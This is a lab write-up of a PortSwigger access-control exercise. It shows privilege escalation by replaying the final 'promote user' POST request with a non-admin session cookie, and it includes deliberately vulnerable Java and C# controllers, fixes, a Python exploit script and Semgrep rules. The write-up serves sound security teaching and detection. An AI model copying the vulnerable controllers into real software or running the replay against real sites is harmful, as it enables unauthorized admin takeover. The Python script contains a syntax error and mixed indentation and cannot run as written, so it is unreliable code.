---
title: "Lab 12: Multi-step process with no access control on one step"
date: 2025-12-17
categories: [portswigger, access_control]
tags: [multi-process_access_control] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab11_access_control/
---

## 1. Executive Summary

**Vulnerability:** Broken Access Control in Multi-Step Logic.

**Description:** The application splits a sensitive action (promoting a user) into a multi-step workflow: **Selection** -> **Confirmation** -> **Execution**. While the initial selection page enforces access control (checking if the user is an admin), the final execution step assumes the user has already passed the check and fails to re-verify privileges.

**Impact:** Privilege Escalation. An attacker can capture the HTTP request for the final execution step and replay it with a non-administrative session, completely bypassing the "Are you sure" gate and the initial access check.

## 2. The Attack

**Objective:** Promote the user `wiener` to administrator by skipping the confirmation logic.

1. **Baselining (Admin):** I logged in as `administrator` to map the valid workflow.
    - **Step 1 (Selection):** I visited the Admin Panel, selected `carlos` from the dropdown, and clicked "Upgrade".
    - **Step 2 (Confirmation):** The page loaded a prompt asking, *"Are you sure you want to upgrade carlos?"* with a "Yes" button.
    - **Step 3 (Execution):** I clicked "Yes". I captured this specific POST request in Burp Suite.
    - **Request:** `POST /admin-roles`
    - **Body:** `action=upgrade&confirmed=true&username=carlos`
2. **Exploitation:** I opened a new browser window and logged in as the regular user `wiener`. I copied my session cookie.
3. **Replay:** In Burp Repeater, I took the Admin's "Execution" request (from Step 3) and:
    - Replaced the session cookie with `wiener`'s cookie.
    - Changed the body to `username=wiener` (to promote myself).
4. **Result:** The server returned `200 OK`. Even though `wiener` cannot access the Admin Panel UI or the "Are you sure" page, the server executed the logic because it failed to re-verify permissions on the final endpoint.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The code handles the workflow in three parts. The `admin_panel` (Step 1) and `confirm_page` (Step 2) are likely protected. However, the method handling the actual `POST` (Step 3) is exposed.

- **The Flaw:** The developer assumes that a user *cannot* reach Step 3 without clicking the button in Step 2. They rely on the workflow order for security.
- **The Reality:** Attackers do not follow workflows. They send requests directly to endpoints.

### Java (Spring Boot)

```java
@Controller
@RequestMapping("/admin")
public class AdminController {

    // STEP 1 & 2: The UI Pages (Secure)
    // These methods correctly check if the user has the ADMIN role.
    @PreAuthorize("hasRole('ADMIN')")
    @GetMapping("/confirm")
    public String showConfirmationPage(@RequestParam String user) {
        return "are_you_sure"; // Renders the "Are you sure?" page
    }

    // STEP 3: The Execution (VULNERABLE)
    // This handles the "Yes" button click.
    // MISSING: @PreAuthorize("hasRole('ADMIN')")
    @PostMapping("/promote-user")
    public String promoteUser(@RequestParam String username, @RequestParam boolean confirmed) {
        
        if (confirmed) {
            // VULNERABLE: Executes logic based solely on input parameters.
            userService.changeRole(username, "ADMIN");
        }
        
        return "redirect:/admin?success";
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@PreAuthorize` on GET**: The `showConfirmationPage` method is secure. If `wiener` tries to load the "Are you sure" page directly, Spring Security blocks them (403 Forbidden).
- **`@PostMapping("/promote-user")`**: This listens for the final form submission.
- **The Missing Check**: Because the developer forgot to add `@PreAuthorize` to this specific method (and didn't put it on the class), any authenticated user can send a POST request here. The code simply checks `if (confirmed)`—a parameter the attacker controls—and runs the upgrade.

### C# (ASP.NET Core)

```csharp
public class AdminController : Controller
{
    // STEP 1 & 2: UI (Secure)
    [Authorize(Roles = "Admin")]
    [HttpGet]
    public IActionResult ConfirmUpgrade(string username)
    {
        return View(model: username); // Renders "Are you sure?"
    }

    // STEP 3: Execution (VULNERABLE)
    // The developer forgot the attribute here.
    [HttpPost]
    public IActionResult DoUpgrade(string username, bool confirmed)
    {
        if (confirmed)
        {
            // VULNERABLE: The server trusts the request came from an admin
            // just because the parameter 'confirmed' is true.
            _userService.SetRole(username, Roles.Admin);
        }
        return RedirectToAction("Index");
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`[Authorize(Roles = "Admin")]`**: Correctly applied to the `HttpGet` method.
- **`DoUpgrade`**: This method handles the `HttpPost`. By default in ASP.NET MVC, if a method is public, it is accessible to anyone (or any authenticated user, depending on global config).
- **Bypass**: The attacker sends a POST to `/Admin/DoUpgrade`. The framework maps the body `confirmed=true` to the method argument. The `if (confirmed)` block evaluates to true, and the privilege escalation occurs.

### Mock PR Comment

I noticed that the `promoteUser` endpoint (handling the POST request) is missing the authorization annotation.

Currently, the access check is only applied to the GET request that renders the "Are you sure?" page. An attacker can skip the confirmation UI entirely and send a POST request directly to the endpoint to escalate privileges. Please apply the authorization check to **every** step of the process, specifically the state-changing POST method.

## 4. The Fix

**Explanation of the Fix:**
We must apply the "Defense in Depth" principle. We treat every endpoint as a standalone entry point. We replicate the `ADMIN` check on the execution step.

### Secure Java

```java
@Controller
@RequestMapping("/admin")
// BEST PRACTICE: Secure the entire Class.
@PreAuthorize("hasRole('ADMIN')") 
public class AdminController {

    @GetMapping("/confirm")
    public String showConfirmationPage(@RequestParam String user) {
        return "are_you_sure";
    }

    // SECURE: Inherits the class-level check.
    @PostMapping("/promote-user")
    public String promoteUser(@RequestParam String username, @RequestParam boolean confirmed) {
        userService.changeRole(username, "ADMIN");
        return "redirect:/admin?success";
    }
}
```

**Technical Flow & Syntax Explanation:**

- **Class-Level Security**: Moving `@PreAuthorize("hasRole('ADMIN')")` to the top of the class ensures it applies to *all* methods inside.
- **No Gaps**: Even if a developer adds a new method later, it is automatically secured.
- **Interceptor**: When the POST request arrives, Spring Security checks the user's role *before* the `promoteUser` method ever runs.

### Secure C#

```csharp
// SECURE: Class-level authorization
[Authorize(Roles = "Admin")]
public class AdminController : Controller
{
    [HttpGet]
    public IActionResult ConfirmUpgrade(string username)
    {
        return View(model: username);
    }

    [HttpPost]
    public IActionResult DoUpgrade(string username, bool confirmed)
    {
        // Even if confirmed is true, a non-admin cannot reach this code.
        _userService.SetRole(username, Roles.Admin);
        return RedirectToAction("Index");
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`[Authorize]` on Class**: Forces the authorization middleware to validate the user's role for every route mapping to this controller.
- **Execution Flow**: Request -> Middleware (Check Role) -> [Fail? Return 403] -> Controller Action. The vulnerable logic is unreachable for attackers.

## 5. Automation

*A Python script that skips the "Are you sure?" step and sends the confirmation request directly.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_multistep_bypass(url, session_cookie, my_username):
	target_path = "/admin-roles"
	data = {
	"action": 'upgrade',
	"confirmed": "true",
	"username:" my_username
	}

	cookies = {"session": session_cookie}

	print(f"[*] Target: {url}{target_path}")
    print(f"[*] Attempting privilege escalation for: {my_username}")
    print("[*] Sending POST request directly (Skipping 'Are you sure' page)...")

    try:
    	resp = requests.post(
    		f"{url.rstrip('/')}{target_path}",
    		data=data,
    		cookies=cookies,
    		allow_redirects=True,
    		timeout=10
    	)

    	print(f"[*] Status Code: {resp.status_code}")

    	if resp.status_code == 200 or resp.status_code == 302:
    		print("[+] Request accepted. Checking permissions...")

    		admin_check = requests.get(f"{url.rstrip('/')}/admin", cookies=cookies)
            if admin_check.status_code == 200:
                print("[!!!] SUCCESS: Admin panel is accessible!")
            else:
                print(f"[-] /admin returned {admin_check.status_code}. Access denied.")
        else:
            print(f"[-] Unexpected response: {resp.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    ap = argparse.ArgumentParser(description="Exploit Multi-Step Access Control Bypass")
    ap.add_argument("url", help="Base URL of the lab")
    ap.add_argument("session", help="Your valid session cookie")
    ap.add_argument("username", help="Your username to promote (e.g., wiener)")
    
    args = ap.parse_args()
    exploit_multistep_bypass(args.url, args.session, args.username)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules detect "Write" operations (POST/PUT/DELETE) in Controllers that lack explicit authorization annotations.*

**The Logic**
We want to flag any Controller method that handles a `POST` request but does *not* have a security annotation (like `@PreAuthorize` or `[Authorize]`). This catches the "Forgotten Annotation" error.

### Java Rule

```yaml
rules:
  - id: java-spring-missing-auth-on-post
    languages: [java]
    message: |
      Found a @PostMapping method without a @PreAuthorize check. 
      Ensure this state-changing endpoint is protected, or that the Class has a global security check.
    severity: WARNING
    patterns:
      - pattern-inside: |
          @Controller
          class $CLASS { ... }
      # Match a POST method
      - pattern: |
          @PostMapping(...)
          public $RET $METHOD(...) { ... }
      # Filter: Exclude methods that DO have PreAuthorize
      - pattern-not: |
          @PreAuthorize(...)
          @PostMapping(...)
          public $RET $METHOD(...) { ... }
      # Filter: Exclude if the CLASS itself is secured
      - pattern-not-inside: |
          @PreAuthorize(...)
          @Controller
          class $CLASS { ... }
```

### C# Rule

```yaml
rules:
  - id: csharp-aspnet-missing-auth-on-post
    languages: [csharp]
    message: "Found HTTP POST action without [Authorize]. Ensure this endpoint is secured."
    severity: WARNING
    patterns:
      - pattern-inside: |
          public class $CONTROLLER : Controller { ... }
      - pattern: |
          [HttpPost]
          public IActionResult $METHOD(...) { ... }
      - pattern-not: |
          [Authorize]
          [HttpPost]
          public IActionResult $METHOD(...) { ... }
      # Check if class is authorized
      - pattern-not-inside: |
          [Authorize]
          public class $CONTROLLER : Controller { ... }
```
